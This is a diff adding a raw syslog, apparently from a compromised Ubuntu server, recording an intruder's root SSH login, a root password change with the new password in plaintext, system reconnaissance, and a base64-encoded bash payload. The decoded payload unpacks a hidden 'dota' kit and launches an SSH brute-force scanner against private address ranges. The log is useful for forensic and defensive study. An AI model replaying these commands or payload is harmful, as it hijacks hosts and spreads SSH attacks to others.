@@ -1,0 +1,153 @@
+Nov 22 14:55:14 DAMUJadmin1 sshd[485]: Accepted password for root from 178.128.242.233 port 45502 ssh2
+Nov 22 14:55:14 DAMUJadmin1 sshd[485]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Nov 22 14:55:14 DAMUJadmin1 snoopy[487]: [uid:0 sid:487 tty:(none) cwd:/ filename:/bin/systemd-tmpfiles]: /bin/systemd-tmpfiles --clean
+Nov 22 14:55:14 DAMUJadmin1 systemd: pam_unix(systemd-user:session): session opened for user root by (uid=0)
+Nov 22 14:55:14 DAMUJadmin1 snoopy[488]: [uid:0 sid:488 tty:(none) cwd:/ filename:/lib/systemd/systemd]: /lib/systemd/systemd --user
+Nov 22 14:55:14 DAMUJadmin1 systemd-logind[158]: New session 63299 of user root.
+Nov 22 14:55:14 DAMUJadmin1 snoopy[491]: [uid:0 sid:488 tty:(none) cwd:/ filename:/usr/lib/systemd/user-generators/systemd-dbus1-generator]: /usr/lib/systemd/user-generators/systemd-dbus1-generator /run/user/0/systemd/generator /run/user/0/systemd/generator.early /run/user/0/systemd/generator.late
+Nov 22 14:55:14 DAMUJadmin1 snoopy[493]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/bin/env]: /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d
+Nov 22 14:55:14 DAMUJadmin1 snoopy[494]: [uid:0 sid:485 tty:(none) cwd:/ filename:/etc/update-motd.d/00-header]: /etc/update-motd.d/00-header
+Nov 22 14:55:14 DAMUJadmin1 snoopy[495]: [uid:0 sid:485 tty:(none) cwd:/ filename:/bin/uname]: uname -o
+Nov 22 14:55:14 DAMUJadmin1 snoopy[496]: [uid:0 sid:485 tty:(none) cwd:/ filename:/bin/uname]: uname -r
+Nov 22 14:55:14 DAMUJadmin1 snoopy[497]: [uid:0 sid:485 tty:(none) cwd:/ filename:/bin/uname]: uname -m
+Nov 22 14:55:14 DAMUJadmin1 snoopy[498]: [uid:0 sid:485 tty:(none) cwd:/ filename:/etc/update-motd.d/10-help-text]: /etc/update-motd.d/10-help-text
+Nov 22 14:55:14 DAMUJadmin1 snoopy[499]: [uid:0 sid:485 tty:(none) cwd:/ filename:/etc/update-motd.d/91-release-upgrade]: /etc/update-motd.d/91-release-upgrade
+Nov 22 14:55:14 DAMUJadmin1 snoopy[502]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/bin/cut]: cut -d  -f4
+Nov 22 14:55:14 DAMUJadmin1 snoopy[501]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/bin/lsb_release]: lsb_release -sd
+Nov 22 14:55:14 DAMUJadmin1 snoopy[503]: [uid:0 sid:503 tty:(none) cwd:/ filename:/usr/sbin/sshd]: /usr/sbin/sshd -D -R
+Nov 22 14:55:14 DAMUJadmin1 snoopy[499]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/lib/ubuntu-release-upgrader/release-upgrade-motd]: /usr/lib/ubuntu-release-upgrader/release-upgrade-motd
+Nov 22 14:55:14 DAMUJadmin1 snoopy[504]: [uid:0 sid:485 tty:(none) cwd:/ filename:/bin/date]: date +%s
+Nov 22 14:55:14 DAMUJadmin1 snoopy[505]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/bin/stat]: stat -c %Y /var/lib/ubuntu-release-upgrader/release-upgrade-available
+Nov 22 14:55:14 DAMUJadmin1 snoopy[506]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/bin/expr]: expr 1569809273 + 86400
+Nov 22 14:55:14 DAMUJadmin1 snoopy[507]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/lib/ubuntu-release-upgrader/check-new-release]: /usr/lib/ubuntu-release-upgrader/check-new-release -q
+Nov 22 14:55:14 DAMUJadmin1 snoopy[508]: [uid:0 sid:485 tty:(none) cwd:/ filename:/etc/update-motd.d/99-esm]: /etc/update-motd.d/99-esm
+Nov 22 14:55:14 DAMUJadmin1 snoopy[509]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/bin/lsb_release]: lsb_release -cs
+Nov 22 14:55:15 DAMUJadmin1 snoopy[511]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/bin/lsb_release]: lsb_release -ds
+Nov 22 14:55:15 DAMUJadmin1 snoopy[514]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/local/sbin/lsb_release]: lsb_release -c -s
+Nov 22 14:55:15 DAMUJadmin1 snoopy[514]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/local/bin/lsb_release]: lsb_release -c -s
+Nov 22 14:55:15 DAMUJadmin1 snoopy[514]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/sbin/lsb_release]: lsb_release -c -s
+Nov 22 14:55:15 DAMUJadmin1 snoopy[514]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/bin/lsb_release]: lsb_release -c -s
+Nov 22 14:55:15 DAMUJadmin1 snoopy[515]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/local/sbin/lsb_release]: lsb_release -c -s
+Nov 22 14:55:15 DAMUJadmin1 snoopy[515]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/local/bin/lsb_release]: lsb_release -c -s
+Nov 22 14:55:15 DAMUJadmin1 snoopy[515]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/sbin/lsb_release]: lsb_release -c -s
+Nov 22 14:55:15 DAMUJadmin1 snoopy[515]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/bin/lsb_release]: lsb_release -c -s
+Nov 22 14:55:15 DAMUJadmin1 sshd[503]: Invalid user nproc from 178.128.242.233
+Nov 22 14:55:15 DAMUJadmin1 sshd[503]: input_userauth_request: invalid user nproc [preauth]
+Nov 22 14:55:15 DAMUJadmin1 sshd[503]: pam_unix(sshd:auth): check pass; user unknown
+Nov 22 14:55:15 DAMUJadmin1 sshd[503]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=178.128.242.233
+Nov 22 14:55:15 DAMUJadmin1 snoopy[516]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/local/sbin/lsb_release]: lsb_release -c -s
+Nov 22 14:55:15 DAMUJadmin1 snoopy[516]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/local/bin/lsb_release]: lsb_release -c -s
+Nov 22 14:55:15 DAMUJadmin1 snoopy[516]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/sbin/lsb_release]: lsb_release -c -s
+Nov 22 14:55:15 DAMUJadmin1 snoopy[516]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/bin/lsb_release]: lsb_release -c -s
+Nov 22 14:55:15 DAMUJadmin1 snoopy[517]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/local/sbin/lsb_release]: lsb_release -r -s
+Nov 22 14:55:15 DAMUJadmin1 snoopy[517]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/local/bin/lsb_release]: lsb_release -r -s
+Nov 22 14:55:15 DAMUJadmin1 snoopy[517]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/sbin/lsb_release]: lsb_release -r -s
+Nov 22 14:55:15 DAMUJadmin1 snoopy[517]: [uid:0 sid:485 tty:(none) cwd:/ filename:/usr/bin/lsb_release]: lsb_release -r -s
+Nov 22 14:55:17 DAMUJadmin1 sshd[503]: Failed password for invalid user nproc from 178.128.242.233 port 45656 ssh2
+Nov 22 14:55:17 DAMUJadmin1 sshd[503]: Received disconnect from 178.128.242.233 port 45656:11: Bye Bye [preauth]
+Nov 22 14:55:17 DAMUJadmin1 sshd[503]: Disconnected from 178.128.242.233 port 45656 [preauth]
+Nov 22 14:55:17 DAMUJadmin1 snoopy[519]: [uid:0 sid:519 tty:(none) cwd:/root filename:/bin/bash]: bash -c cat /proc/cpuinfo | grep name | wc -l
+Nov 22 14:55:17 DAMUJadmin1 snoopy[520]: [uid:0 sid:519 tty:(none) cwd:/root filename:/bin/cat]: cat /proc/cpuinfo
+Nov 22 14:55:17 DAMUJadmin1 snoopy[521]: [uid:0 sid:519 tty:(none) cwd:/root filename:/bin/grep]: grep name
+Nov 22 14:55:17 DAMUJadmin1 snoopy[522]: [uid:0 sid:519 tty:(none) cwd:/root filename:/usr/bin/wc]: wc -l
+Nov 22 14:55:17 DAMUJadmin1 snoopy[524]: [uid:0 sid:524 tty:(none) cwd:/root filename:/bin/bash]: bash -c echo "root:0UK1C7g1aad9"|chpasswd|bash
+Nov 22 14:55:17 DAMUJadmin1 snoopy[526]: [uid:0 sid:524 tty:(none) cwd:/root filename:/usr/sbin/chpasswd]: chpasswd
+Nov 22 14:55:17 DAMUJadmin1 snoopy[527]: [uid:0 sid:524 tty:(none) cwd:/root filename:/bin/bash]: bash
+Nov 22 14:55:17 DAMUJadmin1 chpasswd[526]: pam_unix(chpasswd:chauthtok): password changed for root
+Nov 22 14:55:17 DAMUJadmin1 snoopy[528]: [uid:0 sid:524 tty:(none) cwd:/root filename:/usr/sbin/nscd]: nscd -i passwd
+Nov 22 14:55:17 DAMUJadmin1 snoopy[529]: [uid:0 sid:529 tty:(none) cwd:/root filename:/bin/bash]: bash -c echo "321" > /var/tmp/.var03522123
+Nov 22 14:55:18 DAMUJadmin1 snoopy[530]: [uid:0 sid:530 tty:(none) cwd:/root filename:/bin/bash]: bash -c rm -rf /var/tmp/.var03522123
+Nov 22 14:55:18 DAMUJadmin1 snoopy[530]: [uid:0 sid:530 tty:(none) cwd:/root filename:/bin/rm]: rm -rf /var/tmp/.var03522123
+Nov 22 14:55:18 DAMUJadmin1 snoopy[531]: [uid:0 sid:531 tty:(none) cwd:/root filename:/bin/bash]: bash -c cat /var/tmp/.var03522123 | head -n 1
+Nov 22 14:55:18 DAMUJadmin1 snoopy[532]: [uid:0 sid:531 tty:(none) cwd:/root filename:/bin/cat]: cat /var/tmp/.var03522123
+Nov 22 14:55:18 DAMUJadmin1 snoopy[533]: [uid:0 sid:531 tty:(none) cwd:/root filename:/usr/bin/head]: head -n 1
+Nov 22 14:55:18 DAMUJadmin1 snoopy[534]: [uid:0 sid:534 tty:(none) cwd:/root filename:/bin/bash]: bash -c cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+Nov 22 14:55:18 DAMUJadmin1 snoopy[535]: [uid:0 sid:534 tty:(none) cwd:/root filename:/bin/cat]: cat /proc/cpuinfo
+Nov 22 14:55:18 DAMUJadmin1 snoopy[536]: [uid:0 sid:534 tty:(none) cwd:/root filename:/bin/grep]: grep name
+Nov 22 14:55:18 DAMUJadmin1 snoopy[537]: [uid:0 sid:534 tty:(none) cwd:/root filename:/usr/bin/head]: head -n 1
+Nov 22 14:55:18 DAMUJadmin1 snoopy[538]: [uid:0 sid:534 tty:(none) cwd:/root filename:/usr/bin/awk]: awk {print $4,$5,$6,$7,$8,$9;}
+Nov 22 14:55:19 DAMUJadmin1 snoopy[539]: [uid:0 sid:539 tty:(none) cwd:/root filename:/bin/bash]: bash -c free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+Nov 22 14:55:19 DAMUJadmin1 snoopy[540]: [uid:0 sid:539 tty:(none) cwd:/root filename:/usr/bin/free]: free -m
+Nov 22 14:55:19 DAMUJadmin1 snoopy[541]: [uid:0 sid:539 tty:(none) cwd:/root filename:/bin/grep]: grep Mem
+Nov 22 14:55:19 DAMUJadmin1 snoopy[542]: [uid:0 sid:539 tty:(none) cwd:/root filename:/usr/bin/awk]: awk {print $2 ,$3, $4, $5, $6, $7}
+Nov 22 14:55:19 DAMUJadmin1 snoopy[543]: [uid:0 sid:543 tty:(none) cwd:/root filename:/bin/bash]: bash -c ls -lh $(which ls)
+Nov 22 14:55:19 DAMUJadmin1 snoopy[545]: [uid:0 sid:543 tty:(none) cwd:/root filename:/usr/bin/which]: which ls
+Nov 22 14:55:19 DAMUJadmin1 snoopy[543]: [uid:0 sid:543 tty:(none) cwd:/root filename:/bin/ls]: ls -lh /bin/ls
+Nov 22 14:55:19 DAMUJadmin1 snoopy[546]: [uid:0 sid:546 tty:(none) cwd:/root filename:/bin/bash]: bash -c crontab -l
+Nov 22 14:55:19 DAMUJadmin1 snoopy[546]: [uid:0 sid:546 tty:(none) cwd:/root filename:/usr/bin/crontab]: crontab -l
+Nov 22 14:55:20 DAMUJadmin1 snoopy[547]: [uid:0 sid:547 tty:(none) cwd:/root filename:/bin/bash]: bash -c w
+Nov 22 14:55:20 DAMUJadmin1 snoopy[547]: [uid:0 sid:547 tty:(none) cwd:/root filename:/usr/bin/w]: w
+Nov 22 14:55:20 DAMUJadmin1 snoopy[548]: [uid:0 sid:548 tty:(none) cwd:/root filename:/bin/bash]: bash -c uname -m
+Nov 22 14:55:20 DAMUJadmin1 snoopy[548]: [uid:0 sid:548 tty:(none) cwd:/root filename:/bin/uname]: uname -m
+Nov 22 14:55:20 DAMUJadmin1 snoopy[549]: [uid:0 sid:549 tty:(none) cwd:/root filename:/bin/bash]: bash -c cat /proc/cpuinfo | grep model | grep name | wc -l
+Nov 22 14:55:20 DAMUJadmin1 snoopy[550]: [uid:0 sid:549 tty:(none) cwd:/root filename:/bin/cat]: cat /proc/cpuinfo
+Nov 22 14:55:20 DAMUJadmin1 snoopy[551]: [uid:0 sid:549 tty:(none) cwd:/root filename:/bin/grep]: grep model
+Nov 22 14:55:20 DAMUJadmin1 snoopy[552]: [uid:0 sid:549 tty:(none) cwd:/root filename:/bin/grep]: grep name
+Nov 22 14:55:20 DAMUJadmin1 snoopy[553]: [uid:0 sid:549 tty:(none) cwd:/root filename:/usr/bin/wc]: wc -l
+Nov 22 14:55:20 DAMUJadmin1 snoopy[554]: [uid:0 sid:554 tty:(none) cwd:/root filename:/bin/bash]: bash -c top
+Nov 22 14:55:20 DAMUJadmin1 snoopy[554]: [uid:0 sid:554 tty:(none) cwd:/root filename:/usr/bin/top]: top
+Nov 22 14:55:21 DAMUJadmin1 snoopy[555]: [uid:0 sid:555 tty:(none) cwd:/root filename:/bin/bash]: bash -c uname
+Nov 22 14:55:21 DAMUJadmin1 snoopy[555]: [uid:0 sid:555 tty:(none) cwd:/root filename:/bin/uname]: uname
+Nov 22 14:55:21 DAMUJadmin1 snoopy[556]: [uid:0 sid:556 tty:(none) cwd:/root filename:/bin/bash]: bash -c uname -a
+Nov 22 14:55:21 DAMUJadmin1 snoopy[556]: [uid:0 sid:556 tty:(none) cwd:/root filename:/bin/uname]: uname -a
+Nov 22 14:55:21 DAMUJadmin1 snoopy[557]: [uid:0 sid:557 tty:(none) cwd:/root filename:/bin/bash]: bash -c lscpu | grep Model
+Nov 22 14:55:21 DAMUJadmin1 snoopy[558]: [uid:0 sid:557 tty:(none) cwd:/root filename:/usr/bin/lscpu]: lscpu
+Nov 22 14:55:21 DAMUJadmin1 snoopy[559]: [uid:0 sid:557 tty:(none) cwd:/root filename:/bin/grep]: grep Model
+Nov 22 14:55:22 DAMUJadmin1 snoopy[560]: [uid:0 sid:560 tty:(none) cwd:/root filename:/bin/bash]: bash -c echo "root bash" > /tmp/up.txt
+Nov 22 14:55:22 DAMUJadmin1 snoopy[561]: [uid:0 sid:561 tty:(none) cwd:/root filename:/bin/bash]: bash -c rm -rf /var/tmp/dota*
+Nov 22 14:55:22 DAMUJadmin1 snoopy[561]: [uid:0 sid:561 tty:(none) cwd:/root filename:/bin/rm]: rm -rf /var/tmp/dota*
+Nov 22 14:55:22 DAMUJadmin1 snoopy[562]: [uid:0 sid:562 tty:(none) cwd:/root filename:/bin/bash]: bash -c /usr/lib/openssh/sftp-server
+Nov 22 14:55:22 DAMUJadmin1 snoopy[562]: [uid:0 sid:562 tty:(none) cwd:/root filename:/usr/lib/openssh/sftp-server]: /usr/lib/openssh/sftp-server
+Nov 22 14:57:24 DAMUJadmin1 snoopy[563]: [uid:0 sid:563 tty:(none) cwd:/root filename:/bin/bash]: bash -c cat /var/tmp/.systemcache436621
+Nov 22 14:57:24 DAMUJadmin1 snoopy[563]: [uid:0 sid:563 tty:(none) cwd:/root filename:/bin/cat]: cat /var/tmp/.systemcache436621
+Nov 22 14:57:24 DAMUJadmin1 snoopy[564]: [uid:0 sid:564 tty:(none) cwd:/root filename:/bin/bash]: bash -c echo "1" > /var/tmp/.systemcache436621
+Nov 22 14:57:25 DAMUJadmin1 snoopy[565]: [uid:0 sid:565 tty:(none) cwd:/root filename:/bin/bash]: bash -c cat /var/tmp/.systemcache436621
+Nov 22 14:57:25 DAMUJadmin1 snoopy[565]: [uid:0 sid:565 tty:(none) cwd:/root filename:/bin/cat]: cat /var/tmp/.systemcache436621
+Nov 22 14:57:25 DAMUJadmin1 snoopy[566]: [uid:0 sid:566 tty:(none) cwd:/root filename:/bin/bash]: bash -c sleep 15s && cd /var/tmp; echo "IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApta2RpciAuWDE3LXVuaXgKY2QgLlgxNy11bml4Cm12IC92YXIvdG1wL2RvdGEudGFyLmd6IGRvdGEudGFyLmd6CnRhciB4ZiBkb3RhLnRhci5negpzbGVlcCAzcyAmJiBjZCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYwpub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTkyLjE2OCA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bSAmJiBub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTcyLjE2ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDIwbSAmJiBjZCAuLjsgL3RtcC8uWDE3LXVuaXgvLnJzeW5jL2luaXRhbGwgMj4xJgpleGl0IDA=" | base64 --decode | bash
+Nov 22 14:57:25 DAMUJadmin1 snoopy[567]: [uid:0 sid:566 tty:(none) cwd:/root filename:/bin/sleep]: sleep 15s
+Nov 22 14:57:25 DAMUJadmin1 snoopy[568]: [uid:0 sid:568 tty:(none) cwd:/ filename:/usr/sbin/sshd]: /usr/sbin/sshd -D -R
+Nov 22 14:57:26 DAMUJadmin1 sshd[568]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=178.128.242.233  user=root
+Nov 22 14:57:26 DAMUJadmin1 sshd[568]: pam_succeed_if(sshd:auth): requirement "user = root" was met by user "root"
+Nov 22 14:57:26 DAMUJadmin1 sshd[568]: Accepted password for root from 178.128.242.233 port 56426 ssh2
+Nov 22 14:57:26 DAMUJadmin1 sshd[568]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Nov 22 14:57:26 DAMUJadmin1 systemd-logind[158]: New session 63304 of user root.
+Nov 22 14:57:26 DAMUJadmin1 snoopy[571]: [uid:0 sid:568 tty:(none) cwd:/ filename:/usr/bin/env]: /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d
+Nov 22 14:57:26 DAMUJadmin1 snoopy[572]: [uid:0 sid:568 tty:(none) cwd:/ filename:/etc/update-motd.d/00-header]: /etc/update-motd.d/00-header
+Nov 22 14:57:26 DAMUJadmin1 snoopy[573]: [uid:0 sid:568 tty:(none) cwd:/ filename:/bin/uname]: uname -o
+Nov 22 14:57:26 DAMUJadmin1 snoopy[574]: [uid:0 sid:568 tty:(none) cwd:/ filename:/bin/uname]: uname -r
+Nov 22 14:57:26 DAMUJadmin1 snoopy[575]: [uid:0 sid:568 tty:(none) cwd:/ filename:/bin/uname]: uname -m
+Nov 22 14:57:26 DAMUJadmin1 snoopy[576]: [uid:0 sid:568 tty:(none) cwd:/ filename:/etc/update-motd.d/10-help-text]: /etc/update-motd.d/10-help-text
+Nov 22 14:57:26 DAMUJadmin1 snoopy[577]: [uid:0 sid:568 tty:(none) cwd:/ filename:/etc/update-motd.d/91-release-upgrade]: /etc/update-motd.d/91-release-upgrade
+Nov 22 14:57:26 DAMUJadmin1 snoopy[579]: [uid:0 sid:568 tty:(none) cwd:/ filename:/usr/bin/lsb_release]: lsb_release -sd
+Nov 22 14:57:26 DAMUJadmin1 snoopy[580]: [uid:0 sid:568 tty:(none) cwd:/ filename:/usr/bin/cut]: cut -d  -f4
+Nov 22 14:57:26 DAMUJadmin1 snoopy[577]: [uid:0 sid:568 tty:(none) cwd:/ filename:/usr/lib/ubuntu-release-upgrader/release-upgrade-motd]: /usr/lib/ubuntu-release-upgrader/release-upgrade-motd
+Nov 22 14:57:26 DAMUJadmin1 snoopy[581]: [uid:0 sid:568 tty:(none) cwd:/ filename:/bin/date]: date +%s
+Nov 22 14:57:26 DAMUJadmin1 snoopy[582]: [uid:0 sid:568 tty:(none) cwd:/ filename:/usr/bin/stat]: stat -c %Y /var/lib/ubuntu-release-upgrader/release-upgrade-available
+Nov 22 14:57:26 DAMUJadmin1 snoopy[583]: [uid:0 sid:568 tty:(none) cwd:/ filename:/usr/bin/expr]: expr 1574434514 + 86400
+Nov 22 14:57:26 DAMUJadmin1 snoopy[584]: [uid:0 sid:568 tty:(none) cwd:/ filename:/etc/update-motd.d/99-esm]: /etc/update-motd.d/99-esm
+Nov 22 14:57:26 DAMUJadmin1 snoopy[585]: [uid:0 sid:568 tty:(none) cwd:/ filename:/usr/bin/lsb_release]: lsb_release -cs
+Nov 22 14:57:26 DAMUJadmin1 snoopy[586]: [uid:0 sid:586 tty:(none) cwd:/root filename:/bin/bash]: bash -c whoami
+Nov 22 14:57:26 DAMUJadmin1 snoopy[586]: [uid:0 sid:586 tty:(none) cwd:/root filename:/usr/bin/whoami]: whoami
+Nov 22 14:57:26 DAMUJadmin1 snoopy[587]: [uid:0 sid:568 tty:(none) cwd:/ filename:/usr/bin/lsb_release]: lsb_release -ds
+Nov 22 14:57:26 DAMUJadmin1 sshd[568]: Received disconnect from 178.128.242.233 port 56426:11: Bye Bye
+Nov 22 14:57:26 DAMUJadmin1 sshd[568]: Disconnected from 178.128.242.233 port 56426
+Nov 22 14:57:26 DAMUJadmin1 sshd[568]: pam_unix(sshd:session): session closed for user root
+Nov 22 14:57:26 DAMUJadmin1 sshd[485]: pam_unix(sshd:session): session closed for user root
+Nov 22 14:57:26 DAMUJadmin1 systemd-logind[158]: Removed session 63304.
+Nov 22 14:57:40 DAMUJadmin1 snoopy[589]: [uid:0 sid:566 tty:(none) cwd:/var/tmp filename:/usr/bin/base64]: base64 --decode
+Nov 22 14:57:40 DAMUJadmin1 snoopy[590]: [uid:0 sid:566 tty:(none) cwd:/var/tmp filename:/bin/bash]: bash
+Nov 22 14:57:40 DAMUJadmin1 snoopy[591]: [uid:0 sid:566 tty:(none) cwd:/tmp filename:/bin/rm]: rm -rf .ssh
+Nov 22 14:57:40 DAMUJadmin1 snoopy[592]: [uid:0 sid:566 tty:(none) cwd:/tmp filename:/bin/rm]: rm -rf .mountfs
+Nov 22 14:57:40 DAMUJadmin1 snoopy[593]: [uid:0 sid:566 tty:(none) cwd:/tmp filename:/bin/rm]: rm -rf .X13-unix
+Nov 22 14:57:40 DAMUJadmin1 snoopy[594]: [uid:0 sid:566 tty:(none) cwd:/tmp filename:/bin/rm]: rm -rf .X17-unix
+Nov 22 14:57:40 DAMUJadmin1 snoopy[595]: [uid:0 sid:566 tty:(none) cwd:/tmp filename:/bin/mkdir]: mkdir .X17-unix
+Nov 22 14:57:40 DAMUJadmin1 snoopy[596]: [uid:0 sid:566 tty:(none) cwd:/tmp/.X17-unix filename:/bin/mv]: mv /var/tmp/dota.tar.gz dota.tar.gz
+Nov 22 14:57:40 DAMUJadmin1 snoopy[597]: [uid:0 sid:566 tty:(none) cwd:/tmp/.X17-unix filename:/bin/tar]: tar xf dota.tar.gz
+Nov 22 14:57:40 DAMUJadmin1 snoopy[599]: [uid:0 sid:566 tty:(none) cwd:/tmp/.X17-unix filename:/bin/sleep]: sleep 3s
+Nov 22 14:57:43 DAMUJadmin1 snoopy[600]: [uid:0 sid:566 tty:(none) cwd:/tmp/.X17-unix/.rsync/c filename:/usr/bin/nohup]: nohup /tmp/.X17-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 192.168
+Nov 22 14:57:43 DAMUJadmin1 snoopy[602]: [uid:0 sid:566 tty:(none) cwd:/tmp/.X17-unix/.rsync/c filename:/bin/sleep]: sleep 20m
+Nov 22 14:57:43 DAMUJadmin1 snoopy[603]: [uid:0 sid:566 tty:(none) cwd:/tmp/.X17-unix/.rsync/c filename:/bin/sleep]: sleep 8m
+Nov 22 14:57:43 DAMUJadmin1 snoopy[606]: [uid:0 sid:566 tty:(none) cwd:/tmp/.X17-unix/.rsync/c filename:/bin/readlink]: readlink -f /tmp/.X17-unix/.rsync/c/tsm
+Nov 22 14:57:43 DAMUJadmin1 snoopy[604]: [uid:0 sid:566 tty:(none) cwd:/tmp/.X17-unix/.rsync/c filename:/usr/bin/dirname]: dirname /tmp/.X17-unix/.rsync/c/tsm
+Nov 22 14:57:43 DAMUJadmin1 snoopy[607]: [uid:0 sid:566 tty:(none) cwd:/tmp/.X17-unix/.rsync/c filename:/bin/uname]: uname -m
+Nov 22 14:57:43 DAMUJadmin1 snoopy[608]: [uid:0 sid:566 tty:(none) cwd:/tmp/.X17-unix/.rsync/c filename:/tmp/.X17-unix/.rsync/c/lib/64/tsm]: /tmp/.X17-unix/.rsync/c/lib/64/tsm --library-path /tmp/.X17-unix/.rsync/c/lib/64/ /tmp/.X17-unix/.rsync/c/tsm64 -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 192.168
